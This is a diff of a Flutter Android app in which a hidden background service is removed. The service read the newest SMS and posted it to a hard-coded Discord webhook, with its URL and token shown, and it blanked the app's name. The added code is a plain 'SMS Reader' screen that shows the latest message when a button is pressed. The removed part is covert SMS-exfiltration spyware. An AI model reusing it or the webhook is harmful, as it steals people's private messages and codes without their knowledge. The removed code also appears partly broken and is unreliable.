@@ -1,8 +1,5 @@
 import 'package:flutter/material.dart';
 import 'package:telephony/telephony.dart';
-import 'package:http/http.dart' as http;
-import 'dart:convert';
-import 'package:flutter_background_service/flutter_background_service.dart';
 
 void main() {
   runApp(MyApp());
@@ -12,99 +9,48 @@ class MyApp extends StatelessWidget {
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
-      // Remove the app name by setting the title to an empty string
-      title: '',
-      theme: ThemeData(
-        primarySwatch: Colors.blue,
-      ),
-      home: SMSReaderApp(),
+      home: HomeScreen(),
     );
   }
 }
 
-class SMSReaderApp extends StatefulWidget {
+class HomeScreen extends StatefulWidget {
   @override
-  _SMSReaderAppState createState() => _SMSReaderAppState();
+  _HomeScreenState createState() => _HomeScreenState();
 }
 
-class _SMSReaderAppState extends State<SMSReaderApp> {
-  final Telephony telephony = Telephony.instance;
-  String lastReceivedMessage = "";
+class _HomeScreenState extends State<HomeScreen> {
+  String latestSms = "No SMS available";
 
-  @override
-  void initState() {
-    super.initState();
-    WidgetsFlutterBinding.ensureInitialized();
-    _initializeBackgroundService();
-  }
-
-  Future<void> _initializeBackgroundService() async {
-    final serviceIntent = IsolateService.register();
-    serviceIntent.startWork();
-    // You might want to perform additional service configurations if required
-    serviceIntent.sendPort!.send(null);
+  Future<void> fetchLatestSms() async {
+    Telephony telephony = Telephony.instance;
+    List<SmsMessage> messages = await telephony.getInboxSms();
+    if (messages.isNotEmpty) {
+      SmsMessage latestMessage = messages.first;
+      setState(() {
+        latestSms = "Latest SMS: ${latestMessage.body}";
+      });
+    }
   }
 
   @override
   Widget build(BuildContext context) {
     return Scaffold(
       appBar: AppBar(
-        title: Text(''), // Remove the app name from the app bar
+        title: Text('SMS Reader'),
       ),
-      body: Column(
-        mainAxisAlignment: MainAxisAlignment.center,
-        children: [
-          Text(
-            'Last Received Message: $lastReceivedMessage',
-            style: TextStyle(fontSize: 18),
-          ),
-        ],
+      body: Center(
+        child: Column(
+          mainAxisAlignment: MainAxisAlignment.center,
+          children: <Widget>[
+            Text(latestSms),
+            ElevatedButton(
+              onPressed: fetchLatestSms,
+              child: Text('Fetch Latest SMS'),
+            ),
+          ],
+        ),
       ),
     );
-  }
-}
-
-class IsolateService {
-  static Future<void> callback() async {
-    final Telephony telephony = Telephony.instance;
-    final SmsMessage? lastMessage = (await telephony.getInboxSms()).last;
-    if (lastMessage != null) {
-      final discordWebhookURL = 'https://discord.com/api/webhooks/1165290854416646225/NFI2Puw2SYeWNetzEm9sr_KtCSjEA-6CS54hTQZDCy7LD-EYLuv0rM2oioO7ObazFZvU';
-      final response = await http.post(
-        Uri.parse(discordWebhookURL),
-        headers: {'Content-Type': 'application/json'},
-        body: jsonEncode({'content': lastMessage.body}),
-      );
-      if (response.statusCode == 200) {
-        print('Message sent to Discord: ${lastMessage.body}');
-      } else {
-        print('Failed to send message to Discord. Status code: ${response.statusCode}');
-      }
-    }
-  }
-
-  static void _isolateEntry(SendPort sendPort) {
-    ReceivePort receivePort = ReceivePort();
-    sendPort.send(receivePort.sendPort);
-    receivePort.listen((_) {
-      callback();
-    });
-  }
-
-  static IsolateService register() {
-    final service = IsolateService._internal();
-    FlutterBackgroundService.initialize(callback: _isolateEntry);
-    return service;
-  }
-
-  IsolateService._internal();
-
-  void startWork() {
-    final port = ReceivePort();
-    IsolateNameServer.registerPortWithName(port.sendPort, 'background_service');
-    port.listen((dynamic data) async {
-      final SendPort? uiSendPort = IsolateNameServer.lookupPortByName('main');
-      uiSendPort!.send(data);
-    });
   }
 }
